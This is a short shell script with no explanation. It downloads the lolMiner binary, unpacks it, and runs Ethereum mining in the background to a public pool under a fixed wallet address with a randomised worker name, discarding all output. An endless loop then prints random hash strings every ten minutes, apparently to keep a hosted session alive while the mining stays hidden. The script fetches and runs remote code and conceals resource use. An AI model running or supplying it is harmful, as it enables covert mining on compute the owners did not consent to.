wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz
tar xf lolMiner_v1.51a_Lin64.tar.gz
cd 1.51a
./lolMiner --algo ETHASH --pool us.ethereum.herominers.com:1147 --user 0x3ac93fa10ba1b5875ee684f9adc53cd2edc21522.$(echo $(shuf -i 1-20000 -n 1)-nukzps) --pass 123 --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
